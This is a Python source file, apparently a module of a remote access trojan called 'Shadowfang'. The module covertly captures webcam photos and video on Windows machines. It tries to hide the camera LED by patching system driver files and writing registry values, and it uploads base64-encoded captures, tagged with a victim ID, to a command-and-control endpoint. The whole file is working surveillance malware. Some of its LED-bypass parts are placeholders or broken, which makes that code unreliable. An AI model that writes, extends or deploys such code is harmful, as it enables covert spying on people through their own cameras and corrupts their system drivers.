#!/usr/bin/env python3
"""
SHADOWFANG MODULES - WEBCAM.PY
Webcam capture and surveillance module
Captures photos, records video, bypasses LED indicator
"""

import os
import sys
import time
import json
import base64
import ctypes
import threading
import subprocess
from ctypes import wintypes
from datetime import datetime
from core import CoreUtils, WinAPI, Constants, logger

# ==================== WEBCAM CONSTANTS ====================

class WebcamConstants:
    """Webcam configuration"""
    
    # Capture settings
    CAPTURE_INTERVAL = 60  # Seconds between photos
    VIDEO_DURATION = 30  # Seconds per video
    FRAME_RATE = 15  # FPS for video
    RESOLUTION = (640, 480)  # Default resolution
    HIGH_RESOLUTION = (1280, 720)  # HD resolution
    
    # Output
    OUTPUT_DIR = os.path.join(
        os.environ.get('TEMP', 'C:\\Windows\\Temp'),
        'webcam_captures'
    )
    PHOTO_DIR = "photos"
    VIDEO_DIR = "videos"
    
    # C2
    UPLOAD_ENDPOINT = "/api/v1/webcam"
    UPLOAD_INTERVAL = 300  # 5 minutes
    
    # LED bypass
    LED_BYPASS_METHODS = [
        'driver_patch',
        'firmware_hook',
        'registry_disable'
    ]

# ==================== OPENCV WEBCAM ====================

class OpenCVWebcam:
    """Webcam capture using OpenCV"""
    
    def __init__(self):
        self.cv2 = None
        self.camera = None
        self.available = False
        self.camera_index = 0
        self.is_capturing = False
        
        # Try to import OpenCV
        try:
            import cv2
            self.cv2 = cv2
            self.available = True
        except ImportError:
            logger.warning("OpenCV not available - trying alternative")
            self.available = False
    
    def list_cameras(self):
        """List available cameras"""
        if not self.available:
            return []
        
        cameras = []
        
        try:
            for i in range(5):  # Check first 5 indices
                cap = self.cv2.VideoCapture(i)
                if cap.isOpened():
                    cameras.append(i)
                    cap.release()
            
            return cameras
        except:
            return []
    
    def open_camera(self, index=0, resolution=None):
        """Open camera"""
        if not self.available:
            return False
        
        try:
            self.camera = self.cv2.VideoCapture(index)
            
            if not self.camera.isOpened():
                return False
            
            self.camera_index = index
            
            # Set resolution
            if resolution:
                width, height = resolution
                self.camera.set(self.cv2.CAP_PROP_FRAME_WIDTH, width)
                self.camera.set(self.cv2.CAP_PROP_FRAME_HEIGHT, height)
            
            return True
            
        except Exception as e:
            logger.error(f"Camera open failed: {e}")
            return False
    
    def close_camera(self):
        """Close camera"""
        try:
            if self.camera:
                self.camera.release()
                self.camera = None
            return True
        except:
            return False
    
    def capture_photo(self):
        """Capture single photo"""
        if not self.available or not self.camera:
            return None
        
        try:
            ret, frame = self.camera.read()
            
            if ret:
                # Convert to JPEG bytes
                import cv2
                success, buffer = cv2.imencode('.jpg', frame)
                
                if success:
                    return buffer.tobytes()
            
            return None
            
        except:
            return None
    
    def record_video(self, duration=30, fps=15):
        """Record video"""
        if not self.available or not self.camera:
            return None
        
        try:
            import cv2
            
            # Get frame size
            width = int(self.camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(self.camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            
            # Create video writer
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            video_path = os.path.join(
                WebcamConstants.OUTPUT_DIR,
                WebcamConstants.VIDEO_DIR,
                f"video_{timestamp}.avi"
            )
            
            os.makedirs(os.path.dirname(video_path), exist_ok=True)
            
            video_writer = cv2.VideoWriter(
                video_path,
                fourcc,
                fps,
                (width, height)
            )
            
            # Record frames
            start_time = time.time()
            
            while time.time() - start_time < duration:
                ret, frame = self.camera.read()
                
                if not ret:
                    break
                
                video_writer.write(frame)
            
            video_writer.release()
            
            return video_path
            
        except:
            return None

# ==================== WINDOWS WEBCAM ====================

class WindowsWebcam:
    """Webcam capture using Windows API"""
    
    def __init__(self):
        self.avicap32 = ctypes.windll.avicap32
        self.user32 = ctypes.windll.user32
        self.camera_window = None
        self.available = False
    
    def create_capture_window(self):
        """Create capture window"""
        try:
            # Create window for camera preview
            self.camera_window = self.avicap32.capCreateCaptureWindowW(
                "WebcamCapture",
                0x50000000,  # WS_CHILD | WS_VISIBLE
                0, 0,
                640, 480,
                0, 0
            )
            
            if self.camera_window:
                self.available = True
                return True
            
            return False
            
        except:
            return False
    
    def connect_camera(self, index=0):
        """Connect to camera"""
        try:
            if not self.camera_window:
                self.create_capture_window()
            
            # Connect to device
            result = self.avicap32.capDriverConnect(
                self.camera_window,
                index
            )
            
            return result == 1
            
        except:
            return False
    
    def capture_frame(self):
        """Capture frame using Windows API"""
        try:
            if not self.camera_window:
                return None
            
            # Capture frame to file
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            photo_path = os.path.join(
                WebcamConstants.OUTPUT_DIR,
                WebcamConstants.PHOTO_DIR,
                f"photo_{timestamp}.bmp"
            )
            
            os.makedirs(os.path.dirname(photo_path), exist_ok=True)
            
            # Send capture command
            self.avicap32.capFileSaveDIB(
                self.camera_window,
                photo_path
            )
            
            if os.path.exists(photo_path):
                with open(photo_path, 'rb') as f:
                    return f.read()
            
            return None
            
        except:
            return None
    
    def disconnect_camera(self):
        """Disconnect camera"""
        try:
            if self.camera_window:
                self.avicap32.capDriverDisconnect(self.camera_window)
                self.user32.DestroyWindow(self.camera_window)
                self.camera_window = None
            return True
        except:
            return False

# ==================== LED BYPASS ====================

class LEDBypass:
    """Bypass webcam LED indicator"""
    
    def __init__(self):
        self.bypassed = False
        self.method_used = None
    
    def bypass_via_driver_patch(self):
        """Patch camera driver to disable LED"""
        try:
            # Find camera driver
            driver_paths = [
                'C:\\Windows\\System32\\drivers\\usbvideo.sys',
                'C:\\Windows\\System32\\drivers\\kbdclass.sys'
            ]
            
            for driver_path in driver_paths:
                if os.path.exists(driver_path):
                    # Read driver
                    with open(driver_path, 'rb') as f:
                        driver_data = f.read()
                    
                    # Find LED control byte
                    # This is a simplified example - actual implementation
                    # would locate specific byte patterns
                    
                    # Patch driver
                    patched_data = driver_data.replace(
                        b'\x01\x00\x00\x00\x01',  # LED ON command
                        b'\x00\x00\x00\x00\x00'   # NOP
                    )
                    
                    # Write patched driver
                    with open(driver_path + '.bak', 'wb') as f:
                        f.write(driver_data)
                    
                    with open(driver_path, 'wb') as f:
                        f.write(patched_data)
                    
                    self.bypassed = True
                    self.method_used = 'driver_patch'
                    return True
            
            return False
            
        except:
            return False
    
    def bypass_via_registry(self):
        """Disable LED via registry"""
        try:
            import winreg
            
            # Find camera registry entries
            key_paths = [
                r"SYSTEM\CurrentControlSet\Control\Class\{6BDD1FC6-810F-11D0-BEC7-08002BE2092F}",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam"
            ]
            
            for key_path in key_paths:
                try:
                    key = winreg.OpenKey(
                        winreg.HKEY_LOCAL_MACHINE,
                        key_path,
                        0,
                        winreg.KEY_SET_VALUE
                    )
                    
                    # Set LED control to disabled
                    winreg.SetValueEx(key, "LEDControl", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(key, "DisableLED", 0, winreg.REG_DWORD, 1)
                    
                    winreg.CloseKey(key)
                    
                    self.bypassed = True
                    self.method_used = 'registry_disable'
                    return True
                    
                except:
                    continue
            
            return False
            
        except:
            return False
    
    def bypass_via_firmware_hook(self):
        """Hook firmware to disable LED"""
        try:
            # This would involve USB packet interception
            # Simplified placeholder
            return False
        except:
            return False
    
    def bypass_all(self):
        """Attempt all LED bypass methods"""
        methods = [
            self.bypass_via_driver_patch,
            self.bypass_via_registry,
            self.bypass_via_firmware_hook
        ]
        
        for method in methods:
            try:
                if method():
                    logger.info(f"LED bypass successful: {self.method_used}")
                    return True
            except:
                continue
        
        logger.warning("LED bypass failed - LED may be visible")
        return False

# ==================== WEBCAM MONITOR ====================

class WebcamMonitor:
    """Continuous webcam monitoring"""
    
    def __init__(self):
        self.opencv_cam = OpenCVWebcam()
        self.windows_cam = WindowsWebcam()
        self.led_bypass = LEDBypass()
        self.monitoring = False
        self.monitor_thread = None
        self.stop_monitoring_flag = False
        self.captured_photos = []
        self.captured_videos = []
        self.photo_count = 0
        self.video_count = 0
        self.camera_active = False
    
    def start_monitoring(self, interval=60, capture_video=False, video_interval=300):
        """Start continuous webcam monitoring"""
        if self.monitor_thread and self.monitor_thread.is_alive():
            return True
        
        # Bypass LED first
        self.led_bypass.bypass_all()
        
        # Open camera
        if self.opencv_cam.available:
            self.opencv_cam.open_camera()
            self.camera_active = True
        else:
            self.windows_cam.create_capture_window()
            self.windows_cam.connect_camera()
            self.camera_active = True
        
        self.monitoring = True
        self.stop_monitoring_flag = False
        
        last_video_time = time.time()
        
        def monitor_worker():
            nonlocal last_video_time
            
            while not self.stop_monitoring_flag:
                try:
                    # Capture photo
                    photo_data = self.capture_photo()
                    
                    if photo_data:
                        self.captured_photos.append({
                            'data': photo_data,
                            'timestamp': datetime.now().isoformat(),
                            'size': len(photo_data)
                        })
                        
                        self.photo_count += 1
                        logger.info(f"Photo captured ({len(photo_data)} bytes)")
                    
                    # Capture video if requested
                    if capture_video:
                        current_time = time.time()
                        
                        if current_time - last_video_time >= video_interval:
                            video_path = self.capture_video()
                            
                            if video_path:
                                self.captured_videos.append(video_path)
                                self.video_count += 1
                                last_video_time = current_time
                    
                    time.sleep(interval)
                    
                except:
                    time.sleep(interval)
        
        self.monitor_thread = threading.Thread(target=monitor_worker)
        self.monitor_thread.daemon = True
        self.monitor_thread.start()
        
        logger.info(f"Webcam monitoring started (interval: {interval}s)")
        return True
    
    def capture_photo(self):
        """Capture single photo"""
        try:
            if self.opencv_cam.available:
                return self.opencv_cam.capture_photo()
            else:
                return self.windows_cam.capture_frame()
        except:
            return None
    
    def capture_video(self, duration=30):
        """Capture video"""
        try:
            if self.opencv_cam.available:
                return self.opencv_cam.record_video(duration)
            return None
        except:
            return None
    
    def stop_monitoring(self):
        """Stop monitoring"""
        self.stop_monitoring_flag = True
        self.monitoring = False
        
        # Close camera
        if self.opencv_cam.available:
            self.opencv_cam.close_camera()
        else:
            self.windows_cam.disconnect_camera()
        
        self.camera_active = False
        
        if self.monitor_thread:
            self.monitor_thread.join(timeout=2)
        
        return True
    
    def get_photos(self):
        """Get captured photos"""
        return self.captured_photos
    
    def get_videos(self):
        """Get captured videos"""
        return self.captured_videos
    
    def clear_captures(self):
        """Clear all captures"""
        self.captured_photos.clear()
        self.captured_videos.clear()
        self.photo_count = 0
        self.video_count = 0
        return True

# ==================== WEBCAM SAVER ====================

class WebcamSaver:
    """Save webcam captures"""
    
    def __init__(self):
        self.output_dir = WebcamConstants.OUTPUT_DIR
        self.photo_dir = os.path.join(self.output_dir, WebcamConstants.PHOTO_DIR)
        self.video_dir = os.path.join(self.output_dir, WebcamConstants.VIDEO_DIR)
    
    def save_photo(self, photo_data, filename=None):
        """Save photo to file"""
        try:
            if not filename:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"photo_{timestamp}.jpg"
            
            filepath = os.path.join(self.photo_dir, filename)
            
            os.makedirs(self.photo_dir, exist_ok=True)
            
            with open(filepath, 'wb') as f:
                f.write(photo_data)
            
            logger.info(f"Photo saved: {filepath}")
            return filepath
            
        except Exception as e:
            logger.error(f"Photo save failed: {e}")
            return None
    
    def save_all_photos(self, photos):
        """Save all photos"""
        saved_files = []
        
        for i, photo in enumerate(photos):
            filename = f"photo_{i}_{datetime.now().strftime('%H%M%S')}.jpg"
            filepath = self.save_photo(photo['data'], filename)
            
            if filepath:
                saved_files.append(filepath)
        
        return saved_files
    
    def save_video(self, video_path, filename=None):
        """Save video file"""
        try:
            if not filename:
                filename = os.path.basename(video_path)
            
            dest_path = os.path.join(self.video_dir, filename)
            
            os.makedirs(self.video_dir, exist_ok=True)
            
            shutil.copy2(video_path, dest_path)
            
            return dest_path
            
        except:
            return None

# ==================== WEBCAM UPLOADER ====================

class WebcamUploader:
    """Upload webcam captures to C2"""
    
    def __init__(self, communicator=None):
        self.communicator = communicator
        self.uploaded_photos = []
        self.pending_uploads = []
    
    def upload_photo(self, photo_data, victim_id=None):
        """Upload photo to C2"""
        try:
            encoded_data = base64.b64encode(photo_data).decode()
            
            payload = {
                'type': 'webcam_photo',
                'data': encoded_data,
                'size': len(photo_data),
                'victim_id': victim_id,
                'timestamp': datetime.now().isoformat()
            }
            
            if self.communicator:
                response = self.communicator.send_post(
                    WebcamConstants.UPLOAD_ENDPOINT,
                    payload
                )
                
                if response:
                    self.uploaded_photos.append({
                        'timestamp': datetime.now().isoformat(),
                        'size': len(photo_data)
                    })
                    return True
            
            self.pending_uploads.append({
                'data': encoded_data,
                'timestamp': datetime.now().isoformat()
            })
            
            return False
            
        except:
            return False
    
    def upload_video(self, video_path, victim_id=None):
        """Upload video to C2"""
        try:
            with open(video_path, 'rb') as f:
                video_data = f.read()
            
            encoded_data = base64.b64encode(video_data).decode()
            
            payload = {
                'type': 'webcam_video',
                'data': encoded_data,
                'filename': os.path.basename(video_path),
                'size': len(video_data),
                'victim_id': victim_id,
                'timestamp': datetime.now().isoformat()
            }
            
            if self.communicator:
                response = self.communicator.send_post(
                    WebcamConstants.UPLOAD_ENDPOINT,
                    payload
                )
                
                if response:
                    return True
            
            return False
            
        except:
            return False
    
    def upload_pending(self):
        """Upload all pending photos"""
        if not self.communicator:
            return 0
        
        uploaded = 0
        
        for item in self.pending_uploads[:]:
            payload = {
                'type': 'webcam_photo',
                'data': item['data'],
                'timestamp': item['timestamp']
            }
            
            response = self.communicator.send_post(
                WebcamConstants.UPLOAD_ENDPOINT,
                payload
            )
            
            if response:
                self.pending_uploads.remove(item)
                uploaded += 1
        
        return uploaded

# ==================== MAIN WEBCAM MANAGER ====================

class WebcamManager:
    """Main webcam surveillance orchestrator"""
    
    def __init__(self):
        self.monitor = WebcamMonitor()
        self.saver = WebcamSaver()
        self.uploader = WebcamUploader()
        self.active = False
    
    def start_surveillance(self, interval=60, capture_video=False):
        """Start webcam surveillance"""
        logger.info("Starting webcam surveillance...")
        
        self.monitor.start_monitoring(interval, capture_video)
        
        self.active = True
        return True
    
    def capture_now(self):
        """Capture photo immediately"""
        return self.monitor.capture_photo()
    
    def capture_and_save(self):
        """Capture and save photo"""
        photo_data = self.capture_now()
        
        if photo_data:
            return self.saver.save_photo(photo_data)
        
        return None
    
    def capture_and_upload(self, victim_id=None):
        """Capture and upload photo"""
        photo_data = self.capture_now()
        
        if photo_data:
            return self.uploader.upload_photo(photo_data, victim_id)
        
        return False
    
    def stop_surveillance(self):
        """Stop surveillance"""
        self.monitor.stop_monitoring()
        self.active = False
        return True
    
    def save_all(self):
        """Save all captured photos"""
        return self.saver.save_all_photos(self.monitor.get_photos())
    
    def get_status(self):
        """Get webcam manager status"""
        return {
            'active': self.active,
            'monitoring': self.monitor.monitoring,
            'camera_active': self.monitor.camera_active,
            'photos_captured': self.monitor.photo_count,
            'videos_captured': self.monitor.video_count,
            'led_bypassed': self.monitor.led_bypass.bypassed,
            'led_method': self.monitor.led_bypass.method_used
        }
    
    def cleanup(self, max_age_hours=24):
        """Clean up old captures"""
        try:
            cutoff_time = time.time() - (max_age_hours * 3600)
            
            for directory in [self.saver.photo_dir, self.saver.video_dir]:
                if os.path.exists(directory):
                    for file in os.listdir(directory):
                        filepath = os.path.join(directory, file)
                        
                        if os.path.getmtime(filepath) < cutoff_time:
                            os.remove(filepath)
            
            return True
        except:
            return False

# ==================== SINGLETON INSTANCE ====================

webcam_manager = WebcamManager()

# ==================== EXPORT ====================

__all__ = [
    'OpenCVWebcam',
    'WindowsWebcam',
    'LEDBypass',
    'WebcamMonitor',
    'WebcamSaver',
    'WebcamUploader',
    'WebcamManager',
    'webcam_manager'
]